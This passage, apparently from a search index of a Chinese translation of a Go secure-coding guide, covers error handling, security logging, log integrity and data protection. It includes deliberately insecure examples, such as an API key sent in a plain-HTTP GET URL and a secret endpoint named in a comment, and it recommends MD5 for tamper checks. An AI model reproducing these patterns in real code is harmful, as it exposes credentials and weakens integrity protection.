\u662f\u7684\uff0c\u4f60\u731c\u5bf9\u4e86\uff0c\u4f60\u5c31\u53ef\u4ee5\u9884\u6d4b\u7528\u6237\u7684\u5bc6\u7801\u4e86\uff01","title":"\u4f2a\u968f\u673a\u751f\u6210\u5668"},{"location":"application-security/sdl/go-scp/#_26","text":"\u9519\u8bef\u5904\u7406\u548c\u65e5\u5fd7\u8bb0\u5f55\u662f\u5e94\u7528\u7a0b\u5e8f\u548c\u57fa\u7840\u7ed3\u6784\u4fdd\u62a4\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\u3002\u5f53\u63d0\u5230\u9519\u8bef\u5904\u7406\u65f6\uff0c\u5b83\u662f\u6307\u6355\u83b7\u5e94\u7528\u7a0b\u5e8f\u903b\u8f91\u4e2d\u53ef\u80fd\u5bfc\u81f4\u7cfb\u7edf\u5d29\u6e83\u7684\u4efb\u4f55\u9519\u8bef\uff0c\u9664\u975e\u6b63\u786e\u5904\u7406\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u65e5\u5fd7\u8bb0\u5f55\u8be6\u7ec6\u8bf4\u660e\u4e86\u7cfb\u7edf\u4e0a\u53d1\u751f\u7684\u6240\u6709\u64cd\u4f5c\u548c\u8bf7\u6c42\u3002\u65e5\u5fd7\u8bb0\u5f55\u4e0d\u4ec5\u5141\u8bb8\u8bc6\u522b\u5df2\u53d1\u751f\u7684\u6240\u6709\u64cd\u4f5c\uff0c\u800c\u4e14\u6709\u52a9\u4e8e\u786e\u5b9a\u9700\u8981\u91c7\u53d6\u54ea\u4e9b\u63aa\u65bd\u6765\u4fdd\u62a4\u7cfb\u7edf\u3002\u7531\u4e8e\u653b\u51fb\u8005\u6709\u65f6\u8bd5\u56fe\u901a\u8fc7\u5220\u9664\u65e5\u5fd7\u6765\u5220\u9664\u5176\u64cd\u4f5c\u7684\u6240\u6709\u8ddf\u8e2a\uff0c\u56e0\u6b64\u96c6\u4e2d\u5316\u65e5\u5fd7\u81f3\u5173\u91cd\u8981\u3002","title":"\u9519\u8bef\u5904\u7406\u548c\u8bb0\u5f55"},{"location":"application-security/sdl/go-scp/#_27","text":"\u5728Go\u4e2d\uff0c\u6709\u4e00\u4e2a\u5185\u7f6e\u7684 error \u7c7b\u578b\u3002 error \u7c7b\u578b\u7684\u4e0d\u540c\u503c\u8868\u793a\u5f02\u5e38\u72b6\u6001\u3002\u901a\u5e38\u5728go\u4e2d\uff0c\u5982\u679c\u9519\u8bef\u503c\u4e0d\u662fnil\uff0c\u5219\u4f1a\u53d1\u751f\u4e00\u4e2a\u9519\u8bef\uff0c\u5e76\u4e14\u5fc5\u987b\u8fdb\u884c\u5904\u7406\uff0c\u4ee5\u4fbf\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u5728\u4e0d\u5d29\u6e83\u7684\u60c5\u51b5\u4e0b\u4ece\u6240\u8ff0\u72b6\u6001\u6062\u590d\u3002 Go\u4e2d\u7684\u4e00\u4e2a\u7b80\u5355\u793a\u4f8b\u5982\u4e0b\uff1a if err != nil { // handle the error } \u4e0d\u4ec5\u53ef\u4ee5\u4f7f\u7528\u5185\u7f6e\u9519\u8bef\uff0c\u8fd8\u53ef\u4ee5\u6307\u5b9a\u81ea\u5df1\u7684\u9519\u8bef\u7c7b\u578b\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528erro.New \u51fd\u6570\u3002\u4f8b\u5b50\uff1a {...} if f 0 { return 0, errors.New( math: square root of negative number ) } //If an error has occurred print it if err != nil { fmt.Println(err) } {...} \u4e3a\u4e86\u9632\u6b62\u6211\u4eec\u9700\u8981\u683c\u5f0f\u5316\u5305\u542b\u65e0\u6548\u53c2\u6570\u7684\u5b57\u7b26\u4e32\u6765\u67e5\u770b\u662f\u4ec0\u4e48\u5bfc\u81f4\u4e86\u9519\u8bef\uff0c fmt \u5305\u4e2d\u7684 errorf \u51fd\u6570\u5141\u8bb8\u6211\u4eec\u8fd9\u6837\u505a\u3002 {...} if f 0 { return 0, fmt.Errorf( math: square root of negative number %g , f) } {...} \u5728\u5904\u7406\u9519\u8bef\u65e5\u5fd7\u65f6\uff0c\u5f00\u53d1\u4eba\u5458\u5e94\u786e\u4fdd\u5728\u9519\u8bef\u54cd\u5e94\u4e2d\u4e0d\u6cc4\u6f0f\u654f\u611f\u4fe1\u606f\uff0c\u5e76\u786e\u4fdd\u6ca1\u6709\u9519\u8bef\u5904\u7406\u7a0b\u5e8f\u6cc4\u6f0f\u4fe1\u606f\uff08\u4f8b\u5982\u8c03\u8bd5\u6216\u5806\u6808\u8ddf\u8e2a\u4fe1\u606f\uff09\u3002 \u5728Go\u4e2d\u8fd8\u6709\u989d\u5916\u7684\u9519\u8bef\u5904\u7406\u51fd\u6570\uff0c\u8fd9\u4e9b\u51fd\u6570\u662f\u6050\u614c\u3001\u6062\u590d\u548c\u5ef6\u8fdf\u3002\u5f53\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5904\u4e8e\u6b7b\u673a\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u6b63\u5e38\u6267\u884c\u88ab\u4e2d\u65ad\uff0c\u4efb\u4f55\u5ef6\u8fdf\u8bed\u53e5\u88ab\u6267\u884c\uff0c\u7136\u540e\u51fd\u6570\u8fd4\u56de\u7ed9\u5b83\u7684\u8c03\u7528\u65b9\u3002recover\u901a\u5e38\u5728defer\u8bed\u53e5\u4e2d\u4f7f\u7528\uff0c\u5e76\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u91cd\u65b0\u83b7\u5f97\u5bf9\u6050\u614c\u4f8b\u7a0b\u7684\u63a7\u5236\u6743\uff0c\u7136\u540e\u8fd4\u56de\u6b63\u5e38\u6267\u884c\u3002\u4ee5\u4e0b\u4ee3\u7801\u6bb5\u57fa\u4e8eGo\u6587\u6863\u89e3\u91ca\u4e86\u6267\u884c\u6d41\u7a0b\uff1a func main () { start() fmt.Println( Returned normally from start(). ) } func start () { defer func () { if r := recover(); r != nil { fmt.Println( Recovered in start() ) } }() fmt.Println( Called start() ) part2(0) fmt.Println( Returned normally from part2(). ) } func part2 (i int) { if i 0 { fmt.Println( Panicking in part2()! ) panic(fmt.Sprintf( %v , i)) } defer fmt.Println( Defer in part2() ) fmt.Println( Executing part2() ) part2(i + 1) } \u8f93\u51fa\uff1a Called start() Executing part2() Panicking in part2()! Defer in part2() Recovered in start() Returned normally from start(). \u901a\u8fc7\u68c0\u67e5\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230Go\u5982\u4f55\u5904\u7406\u7d27\u6025\u60c5\u51b5\u5e76\u4ece\u4e2d\u6062\u590d\uff0c\u4ece\u800c\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u6062\u590d\u5176\u6b63\u5e38\u72b6\u6001\u3002\u8fd9\u4e9b\u51fd\u6570\u5141\u8bb8\u4ece\u539f\u672c\u4e0d\u53ef\u6062\u590d\u7684\u6545\u969c\u4e2d\u8fdb\u884c\u4f18\u96c5\u7684\u6062\u590d\u3002 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5ef6\u8fdf\u4f7f\u7528\u8fd8\u5305\u62ec\u4e92\u65a5\u9501\u89e3\u9501\uff0c\u6216\u8005\u5728\u6267\u884c\u4e86\u5468\u56f4\u7684\u51fd\u6570\uff08\u4f8b\u5982\u9875\u811a\uff09\u4e4b\u540e\u52a0\u8f7d\u5185\u5bb9\u3002 \u5728\u65e5\u5fd7\u5305\u4e2d\u8fd8\u6709\u4e00\u4e2alog.fatal\u3002\u81f4\u547d\u7ea7\u522b\u662f\u6709\u6548\u5730\u8bb0\u5f55\u6d88\u606f\uff0c\u7136\u540e\u8c03\u7528os.exit\uff081\uff09\u3002\u8fd9\u610f\u5473\u7740\uff1a \u5c06\u4e0d\u6267\u884cdefer\u8bed\u53e5\u3002 \u7f13\u51b2\u533a\u5c06\u4e0d\u4f1a\u88ab\u5237\u65b0\u3002 \u4e0d\u4f1a\u5220\u9664\u4e34\u65f6\u6587\u4ef6\u548c\u76ee\u5f55\u3002 \u8003\u8651\u5230\u524d\u9762\u63d0\u5230\u7684\u6240\u6709\u70b9\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230log.fatal\u4e0e\u6050\u614c\u7684\u533a\u522b\uff0c\u4ee5\u53ca\u5e94\u8be5\u8c28\u614e\u4f7f\u7528\u5b83\u7684\u539f\u56e0\u3002\u53ef\u80fd\u4f7f\u7528log.fatal\u7684\u4e00\u4e9b\u793a\u4f8b\u5305\u62ec\uff1a \u8bbe\u7f6e\u65e5\u5fd7\u8bb0\u5f55\u5e76\u68c0\u67e5\u6211\u4eec\u662f\u5426\u6709\u5065\u5168\u7684\u73af\u5883\u548c\u53c2\u6570\u3002\u5982\u679c\u6211\u4eec\u4e0d\u8fd9\u6837\u505a\uff0c\u90a3\u4e48\u5c31\u4e0d\u9700\u8981\u6267\u884cmain\uff08\uff09\u3002 \u4e00\u4e2a\u6c38\u8fdc\u4e0d\u4f1a\u53d1\u751f\u7684\u9519\u8bef\uff0c\u6211\u4eec\u77e5\u9053\u5b83\u662f\u4e0d\u53ef\u6062\u590d\u7684\u3002 \u5982\u679c\u4e00\u4e2a\u975e\u4ea4\u4e92\u8fdb\u7a0b\u9047\u5230\u9519\u8bef\u800c\u65e0\u6cd5\u5b8c\u6210\uff0c\u5219\u65e0\u6cd5\u5c06\u6b64\u9519\u8bef\u901a\u77e5\u7528\u6237\u3002\u6700\u597d\u5148\u505c\u6b62\u6267\u884c\uff0c\u7136\u540e\u518d\u4ece\u5931\u8d25\u4e2d\u51fa\u73b0\u5176\u4ed6\u95ee\u9898\u3002 \u521d\u59cb\u5316\u5931\u8d25\u7684\u4f8b\u5b50\u8bf4\u660e\uff1a func init(i int) { ... //This is just to deliberately crash the function. if i 2 { fmt.Printf( Var %d - initialized\\n , i) } else { //This was never supposed to happen, so we'll terminate our program. log.Fatal( Init failure - Terminating. ) } } func main() { i := 1 for i 3 { init(i) i++ } fmt.Println( Initialized all variables successfully ) \u91cd\u8981\u7684\u662f\u8981\u786e\u4fdd\u5728\u4e0e\u5b89\u5168\u63a7\u5236\u76f8\u5173\u8054\u7684\u9519\u8bef\u60c5\u51b5\u4e0b\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u62d2\u7edd\u8bbf\u95ee\u3002","title":"\u9519\u8bef\u5904\u7406"},{"location":"application-security/sdl/go-scp/#_28","text":"\u65e5\u5fd7\u8bb0\u5f55\u5e94\u59cb\u7ec8\u7531\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\uff0c\u4e0d\u5e94\u4f9d\u8d56\u670d\u52a1\u5668\u914d\u7f6e\u3002 \u6240\u6709\u65e5\u5fd7\u8bb0\u5f55\u90fd\u5e94\u8be5\u7531\u53d7\u4fe1\u4efb\u7cfb\u7edf\u4e0a\u7684\u4e3b\u4f8b\u7a0b\u5b9e\u73b0\uff0c\u5f00\u53d1\u4eba\u5458\u8fd8\u5e94\u8be5\u786e\u4fdd\u65e5\u5fd7\u4e2d\u4e0d\u5305\u542b\u654f\u611f\u6570\u636e\uff08\u4f8b\u5982\u5bc6\u7801\u3001\u4f1a\u8bdd\u4fe1\u606f\u3001\u7cfb\u7edf\u8be6\u7ec6\u4fe1\u606f\u7b49\uff09\uff0c\u4e5f\u4e0d\u5b58\u5728\u4efb\u4f55\u8c03\u8bd5\u6216\u5806\u6808\u8ddf\u8e2a\u4fe1\u606f\u3002\u6b64\u5916\uff0c\u65e5\u5fd7\u8bb0\u5f55\u5e94\u8be5\u5305\u62ec\u6210\u529f\u548c\u5931\u8d25\u7684\u5b89\u5168\u4e8b\u4ef6\uff0c\u91cd\u70b9\u662f\u91cd\u8981\u7684\u65e5\u5fd7\u4e8b\u4ef6\u6570\u636e\u3002 \u91cd\u8981\u4e8b\u4ef6\u6570\u636e\u901a\u5e38\u6307\uff1a \u6240\u6709\u8f93\u5165\u9a8c\u8bc1\u5931\u8d25\u3002 \u6240\u6709\u8eab\u4efd\u9a8c\u8bc1\u5c1d\u8bd5\uff0c\u5c24\u5176\u662f\u5931\u8d25\u3002 \u6240\u6709\u8bbf\u95ee\u63a7\u5236\u5931\u8d25\u3002 \u6240\u6709\u660e\u663e\u7684\u7be1\u6539\u4e8b\u4ef6\uff0c\u5305\u62ec\u5bf9\u72b6\u6001\u6570\u636e\u7684\u610f\u5916\u66f4\u6539\u3002 \u4f7f\u7528\u65e0\u6548\u6216\u8fc7\u671f\u7684\u4f1a\u8bdd\u4ee4\u724c\u8fdb\u884c\u8fde\u63a5\u7684\u6240\u6709\u5c1d\u8bd5\u3002 \u6240\u6709\u7cfb\u7edf\u5f02\u5e38\u3002 \u6240\u6709\u7ba1\u7406\u529f\u80fd\uff0c\u5305\u62ec\u5bf9\u5b89\u5168\u914d\u7f6e\u8bbe\u7f6e\u7684\u66f4\u6539\u3002 \u6240\u6709\u540e\u7aefTLS\u8fde\u63a5\u6545\u969c\u548c\u52a0\u5bc6\u6a21\u5757\u6545\u969c\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u65e5\u5fd7\u793a\u4f8b\u8bf4\u660e\u4e86\u8fd9\u4e00\u70b9\uff1a func main() { var buf bytes.Buffer var RoleLevel int logger := log.New( buf, logger: , log.Lshortfile) fmt.Println( Please enter your user level. ) fmt.Scanf( %d , RoleLevel) // --- example switch RoleLevel { case 1: // Log successful login logger.Printf( Login successfull. ) fmt.Print( buf) case 2: // Log unsuccessful Login logger.Printf( Login unsuccessful - Insufficient access level. ) fmt.Print( buf) default: // Unspecified error logger.Print( Login error. ) fmt.Print( buf) } } \u5b9e\u73b0\u901a\u7528\u9519\u8bef\u6d88\u606f\u6216\u81ea\u5b9a\u4e49\u9519\u8bef\u9875\u4e5f\u662f\u4e00\u4e2a\u597d\u7684\u5b9e\u8df5\uff0c\u4ee5\u786e\u4fdd\u5728\u53d1\u751f\u9519\u8bef\u65f6\u4e0d\u4f1a\u6cc4\u6f0f\u4efb\u4f55\u4fe1\u606f\u3002 \u6839\u636e\u6587\u6863\uff0c Go log package \u201c\u5b9e\u73b0\u7b80\u5355\u7684\u65e5\u5fd7\u8bb0\u5f55\u201d\uff0c\u7f3a\u5c11\u4e00\u4e9b\u5e38\u89c1\u548c\u91cd\u8981\u7684\u529f\u80fd\uff0c\u4f8b\u5982\u7ea7\u522b\u5316\u7684\u65e5\u5fd7\u8bb0\u5f55\uff08\u4f8b\u5982\uff0c\u8c03\u8bd5\u3001\u4fe1\u606f\u3001\u8b66\u544a\u3001\u9519\u8bef\u3001\u81f4\u547d\u3001\u6b7b\u673a\uff09\u548c\u683c\u5f0f\u5316\u7a0b\u5e8f\u652f\u6301\uff08\u4f8b\u5982\uff0clogstash\uff09\uff1a\u8fd9\u662f\u4f7f\u65e5\u5fd7\u53ef\u7528\u7684\u4e24\u4e2a\u91cd\u8981\u529f\u80fd\uff08\u4f8b\u5982\uff0c\u7528\u4e8e\u4e0e\u5b89\u5168\u4fe1\u606f\u548c\u4e8b\u4ef6\u96c6\u6210\uff09\u7ba1\u7406\u4f53\u7cfb\uff09\u3002 \u5927\u591a\u6570\uff08\u5982\u679c\u4e0d\u662f\u5168\u90e8\uff09\u7b2c\u4e09\u65b9\u65e5\u5fd7\u8bb0\u5f55\u5305\u90fd\u63d0\u4f9b\u8fd9\u4e9b\u529f\u80fd\u548c\u5176\u4ed6\u529f\u80fd\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u540e\u6d41\u884c\u7684\u7b2c\u4e09\u65b9\u65e5\u5fd7\u8bb0\u5f55\u5305\uff1a Logrus - https://github.com/Sirupsen/logrus glog - https://github.com/golang/glog loggo - https://github.com/juju/loggo \u5173\u4e8e Go's log package \u7684\u4e00\u4e2a\u91cd\u8981\u6ce8\u610f\u4e8b\u9879\u662f\uff1a\u81f4\u547d\u7684\u548c\u7d27\u6025\u7684\u51fd\u6570\u90fd\u6bd4\u65e5\u5fd7\u529f\u80fd\u505a\u5f97\u66f4\u591a\u3002panic\u51fd\u6570\u5728\u5199\u5165\u65e5\u5fd7\u6d88\u606f\u540e\u8c03\u7528panic\u5e93\u901a\u5e38\u4e0d\u63a5\u53d7\u7684\u5185\u5bb9\uff0c\u800c\u81f4\u547d\u7684\u51fd\u6570\u8c03\u7528os\u3002\u5728\u5199\u5165\u65e5\u5fd7\u6d88\u606f\u540e\u9000\u51fa\uff081\uff09\u53ef\u80fd\u7ec8\u6b62\u7a0b\u5e8f\u4ee5\u963b\u6b62\u5ef6\u8fdf\u8bed\u53e5\u8fd0\u884c\u3001\u8981\u5237\u65b0\u7684\u7f13\u51b2\u533a\u548c/\u6216\u8981\u5220\u9664\u7684\u4e34\u65f6\u6570\u636e\u3002 \u4ece\u65e5\u5fd7\u8bbf\u95ee\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u53ea\u6709\u6388\u6743\u7684\u4e2a\u4eba\u624d\u53ef\u4ee5\u8bbf\u95ee\u65e5\u5fd7\u3002\u5f00\u53d1\u4eba\u5458\u8fd8\u5e94\u786e\u4fdd\u8bbe\u7f6e\u4e86\u5141\u8bb8\u65e5\u5fd7\u5206\u6790\u7684\u673a\u5236\uff0c\u5e76\u786e\u4fdd\u4e0d\u53d7\u4fe1\u4efb\u7684\u6570\u636e\u4e0d\u4f1a\u4f5c\u4e3a\u4ee3\u7801\u5728\u9884\u671f\u7684\u65e5\u5fd7\u67e5\u770b\u8f6f\u4ef6\u6216\u754c\u9762\u4e2d\u6267\u884c\u3002 \u5173\u4e8e\u5206\u914d\u7684\u5185\u5b58\u6e05\u7406\uff0cGo\u6709\u4e00\u4e2a\u5185\u7f6e\u7684\u5783\u573e\u6536\u96c6\u5668\u3002 \u4f5c\u4e3a\u786e\u4fdd\u65e5\u5fd7\u6709\u6548\u6027\u548c\u5b8c\u6574\u6027\u7684\u6700\u540e\u4e00\u6b65\uff0c\u5e94\u4f7f\u7528\u52a0\u5bc6\u54c8\u5e0c\u51fd\u6570\u4f5c\u4e3a\u9644\u52a0\u6b65\u9aa4\uff0c\u4ee5\u786e\u4fdd\u4e0d\u4f1a\u53d1\u751f\u65e5\u5fd7\u7be1\u6539\u3002 {...} // Get our known Log checksum from checksum file. logChecksum, err := ioutil.ReadFile( log/checksum ) str := string(logChecksum) // convert content to a 'string' // Compute our current log's MD5 b, err := ComputeMd5( log/log ) if err != nil { fmt.Printf( Err: %v , err) } else { md5Result := hex.EncodeToString(b) // Compare our calculated hash with our stored hash if str == md5Result { // Ok the checksums match. fmt.Println( Log integrity OK. ) } else { // The file integrity has been compromised... fmt.Println( File Tampering detected. ) } } {...} \u6ce8\u610f \uff1a computemd5() \u51fd\u6570\u8ba1\u7b97\u6587\u4ef6\u7684md5\u3002\u540c\u6837\u91cd\u8981\u7684\u662f\uff0c\u5fc5\u987b\u5c06\u65e5\u5fd7\u6587\u4ef6\u54c8\u5e0c\u5b58\u50a8\u5728\u5b89\u5168\u7684\u5730\u65b9\uff0c\u5e76\u4e0e\u5f53\u524d\u65e5\u5fd7\u54c8\u5e0c\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ee5\u5728\u5bf9\u65e5\u5fd7\u8fdb\u884c\u4efb\u4f55\u66f4\u65b0\u4e4b\u524d\u9a8c\u8bc1\u5b8c\u6574\u6027\u3002\u6587\u6863\u4e2d\u5305\u542b\u5b8c\u6574\u7684\u6e90\u4ee3\u7801\u3002","title":"\u65e5\u5fd7"},{"location":"application-security/sdl/go-scp/#_29","text":"\u73b0\u5982\u4eca\uff0c\u5b89\u5168\u4e2d\u6700\u91cd\u8981\u7684\u4e8b\u60c5\u4e4b\u4e00\u5c31\u662f\u6570\u636e\u4fdd\u62a4\u3002\u4f60\u4e0d\u4f1a\u60f3\u8981\uff1a \u7b80\u800c\u8a00\u4e4b\uff0cWeb\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u6570\u636e\u9700\u8981\u53d7\u5230\u4fdd\u62a4\uff0c\u56e0\u6b64\u5728\u672c\u8282\u4e2d\uff0c\u6211\u4eec\u5c06\u7814\u7a76\u4fdd\u62a4\u6570\u636e\u7684\u4e0d\u540c\u65b9\u6cd5\u3002 \u4f60\u5e94\u8be5\u6ce8\u610f\u7684\u7b2c\u4e00\u4ef6\u4e8b\u662f\u4e3a\u6bcf\u4e2a\u7528\u6237\u521b\u5efa\u548c\u5b9e\u73b0\u6b63\u786e\u7684\u6743\u9650\uff0c\u5e76\u5c06\u7528\u6237\u4ec5\u9650\u4e8e\u4ed6\u4eec\u771f\u6b63\u9700\u8981\u7684\u529f\u80fd\u3002 \u4f8b\u5982\uff0c\u8003\u8651\u4e00\u4e2a\u5177\u6709\u4ee5\u4e0b\u7528\u6237\u89d2\u8272\u7684\u7b80\u5355\u5728\u7ebf\u5546\u5e97\uff1a \u9500\u552e\u7528\u6237\uff1a\u53ea\u5141\u8bb8\u67e5\u770b\u76ee\u5f55 \u8425\u9500\u7528\u6237\uff1a\u5141\u8bb8\u67e5\u770b\u7edf\u8ba1\u6570\u636e \u5f00\u53d1\u4eba\u5458\uff1a\u5141\u8bb8\u4fee\u6539\u9875\u9762\u548cweb\u5e94\u7528\u7a0b\u5e8f\u9009\u9879 \u6b64\u5916\uff0c\u5728\u7cfb\u7edf\u914d\u7f6e(\u53c8\u79f0\u4e3aweb\u670d\u52a1\u5668)\u4e2d\uff0c\u5e94\u8be5\u5b9a\u4e49\u6b63\u786e\u7684\u6743\u9650\u3002 \u4e3b\u8981\u662f\u4e3a\u6bcf\u4e2a\u7528\u6237\u5b9a\u4e49\u6b63\u786e\u7684\u89d2\u8272 \u2014\u2014 web\u7528\u6237\u6216\u7cfb\u7edf\u7528\u6237\u3002 \u8bbf\u95ee\u63a7\u5236 \u90e8\u5206\uff0c\u5c06\u8fdb\u4e00\u6b65\u8ba8\u8bba\u89d2\u8272\u5206\u79bb\u548c\u8bbf\u95ee\u63a7\u5236\u3002","title":"\u6570\u636e\u4fdd\u62a4"},{"location":"application-security/sdl/go-scp/#_30","text":"\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u4e34\u65f6\u6587\u4ef6\u548c\u7f13\u5b58\u6587\u4ef6\u5e94\u8be5\u5728\u4e0d\u9700\u8981\u65f6\u7acb\u5373\u5220\u9664\u3002\u5982\u679c\u4f60\u4ecd\u7136\u9700\u8981\u5b83\u4eec\u4e2d\u7684\u67d0\u4e9b\u5185\u5bb9\uff0c\u5c06\u5b83\u4eec\u79fb\u5230\u53d7\u4fdd\u62a4\u7684\u533a\u57df\u6216\u5bf9\u5b83\u4eec\u52a0\u5bc6\u3002","title":"\u5220\u9664\u654f\u611f\u4fe1\u606f"},{"location":"application-security/sdl/go-scp/#_31","text":"\u6709\u65f6\u5019\u5f00\u53d1\u4eba\u5458\u4f1a\u5728\u6e90\u4ee3\u7801\u4e2d\u7559\u4e0b\u7c7b\u4f3c\u4e8eTo-do\u5217\u8868\u7684\u6ce8\u91ca\uff0c\u8fd8\u6709\u65f6\u5019\uff0c\u5728\u6700\u574f\u7684\u60c5\u51b5\u4e0b\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u80fd\u4f1a\u7559\u4e0b\u51ed\u8bc1\u3002 // Secret API endpoint - /api/mytoken?callback=myToken fmt.Println( Just a random code ) \u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u5f00\u53d1\u4eba\u5458\u5728\u6ce8\u91ca\u4e2d\u6709\u4e00\u4e2a endpoint \uff0c\u5982\u679c\u6ca1\u6709\u5f97\u5230\u5f88\u597d\u7684\u4fdd\u62a4\uff0c\u5219\u53ef\u80fd\u88ab\u6076\u610f\u7528\u6237\u4f7f\u7528\u3002","title":"\u6ce8\u91ca"},{"location":"application-security/sdl/go-scp/#url_1","text":"\u4f7f\u7528HTTP GET\u65b9\u6cd5\u4f20\u9012\u654f\u611f\u4fe1\u606f\u4f1a\u4f7fweb\u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u53d7\u5230\u653b\u51fb\uff0c\u56e0\u4e3a\uff1a 1. \u5982\u679c\u4e0d\u4f7f\u7528HTTPS\uff0c\u901a\u8fc7MITM\u653b\u51fb\uff0c\u6570\u636e\u53ef\u80fd\u88ab\u62e6\u622a\u3002 2. \u6d4f\u89c8\u5668\u5386\u53f2\u8bb0\u5f55\u5b58\u50a8\u7528\u6237\u7684\u4fe1\u606f\u3002\u5982\u679cURL\u4e2d\uff0c\u5e26\u6709\u672a\u8fc7\u671f\u7684 session IDs \u3001 pins \u6216 tokens (\u6216\u4f4e\u71b5\u503c)\uff0c\u5219\u5b83\u4eec\u53ef\u80fd\u88ab\u7a83\u53d6\u3002 req, _ := http.NewRequest( GET , http://mycompany.com/api/mytoken?api_key=000s3cr3t000 , nil) \u5982\u679cweb\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u4f60\u7684api_key\u4ece\u7b2c\u4e09\u65b9\u7f51\u7ad9\u83b7\u53d6\u4fe1\u606f\uff0c\u90a3\u4e48\u5982\u679c\u6709\u4eba\u5728\u76d1\u542c\u4f60\u7684\u7f51\u7edc\uff0c\u90a3\u4e48\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4f1a\u88ab\u7a83\u53d6\u3002\u8fd9\u662f\u56e0\u4e3a\u4e0d\u4f7f\u7528HTTPS\u548c\u4f7f\u7528GET\u65b9\u6cd5\u4f20\u9012\u53c2\u6570\u3002 \u6b64\u5916\uff0c\u5982\u679c\u4f60\u7684web\u5e94\u7528\u7a0b\u5e8f\u6709\u6307\u5411\u793a\u4f8b\u7ad9\u70b9\u7684\u94fe\u63a5\uff1a http://mycompany.com/api/mytoken?api_key=000s3cr3t000 \u5b83\u5c06\u5b58\u50a8\u5728\u4f60\u7684\u6d4f\u89c8\u5668\u5386\u53f2\u8bb0\u5f55\u4e2d\uff0c\u56e0\u6b64\uff0c\u5b83\u4e5f\u53ef\u80fd\u88ab\u7a83\u53d6\u3002 \u89e3\u51b3\u65b9\u6848\u662f\uff0c\u5e94\u8be5\u59cb\u7ec8\u4f7f\u7528HTTPS\u3002\u6b64\u5916\uff0c\u5c1d\u8bd5\u4f7f\u7528POST\u65b9\u6cd5\u4f20\u9012\u53c2\u6570\uff0c\u5982\u679c\u53ef\u80fd\u7684\u8bdd\uff0c\u53ea\u4f7f\u7528\u4e00\u6b21\u6027\u7684session id\u6216token\u3002","title":"URL"},{"location":"application-security/sdl/go-scp/#_32","text":"\u4f60\u5e94\u8be5\u59cb\u7ec8\u5220\u9664\u751f\u4ea7\u73af\u5883\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u548c\u7cfb\u7edf\u6587\u6863\u3002\u6709\u4e9b\u6587\u6863\u53ef\u80fd\u4f1a\u516c\u5f00\u4e00\u4e9b\u7248\u672c\u6216\u529f\u80fd(\u4f8b\u5982Readme\u3001Changelog\u7b49)\uff0c\u8fd9\u4e9b\u529f\u80fd\u53ef\u4ee5\u88ab\u7528\u6765\u653b\u51fbweb\u5e94\u7528\u7a0b\u5e8f\u3002 \u4f5c\u4e3a\u5f00\u53d1\u4eba\u5458\uff0c\u4f60\u5e94\u8be5\u5141\u8bb8\u7528\u6237\u5220\u9664\u4e0d\u518d\u4f7f\u7528\u7684\u654f\u611f\u4fe1\u606f\u3002\u5047\u8bbe\u7528\u6237\u5e10\u6237\u4e0a\u7684\u4fe1\u7528\u5361\u8fc7\u671f\u4e86\uff0c\u60f3\u8981\u5220\u9664\u5b83\u4eec \u2014 web\u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u5141\u8bb8\u8fd9\u6837\u505a\u3002 \u6240\u6709\u4e0d\u518d\u9700\u8981\u7684\u4fe1\u606f\u5fc5\u987b\u4ece\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5220\u9664\u3002","title":"\u4fe1\u606f\u5c31\u662f\u529b\u91cf"},{"location":"application-security/sdl/go-scp/#_33","text":"web\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u6bcf\u4e2a\u9ad8\u5ea6\u654f\u611f\u7684\u4fe1\u606f\u90fd\u5e94\u8be5\u52a0\u5bc6\u3002\u4f7f\u7528Go\u4e2d\u63d0\u4f9b\u7684 \u519b\u7528\u7ea7\u52a0\u5bc6 \uff1b\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 \u52a0\u5bc6\u5b9e\u8df5 \u90e8\u5206\u3002 \u5982\u679c\u9700\u8981\u5728\u5176\u4ed6\u5730\u65b9\u6267\u884c\u7684\u7684\u4ee3\u7801\uff0c\u90a3\u4e48\u53ea\u9700\u7f16\u8bd1\u5e76\u5171\u4eab\u4e8c\u8fdb\u5236\u6587\u4ef6 \u2014 \u6ca1\u6709\u53ef\u9760\u7684\u89e3\u51b3\u65b9\u6848\u6765\u9632\u6b62\u9006\u5411\u5de5\u7a0b\u3002 \u83b7\u5f97\u8bbf\u95ee\u4ee3\u7801\u7684\u4e0d\u540c\u6743\u9650\u5e76\u9650\u5236\u6e90\u4ee3\u7801\u7684\u8bbf\u95ee\u662f\u6700\u597d\u7684\u65b9\u6cd5\u3002 \u4e0d\u8981\u5728\u5ba2\u6237\u7aef\u4ee5\u660e\u6587\u6216\u4efb\u4f55\u975e\u52a0\u5bc6\u5b89\u5168\u7684\u65b9\u5f0f\u5b58\u50a8\u5bc6\u7801\u3001\u8fde\u63a5\u5b57\u7b26\u4e32(\u53c2\u89c1\u201c \u6570\u636e\u5b89\u5168 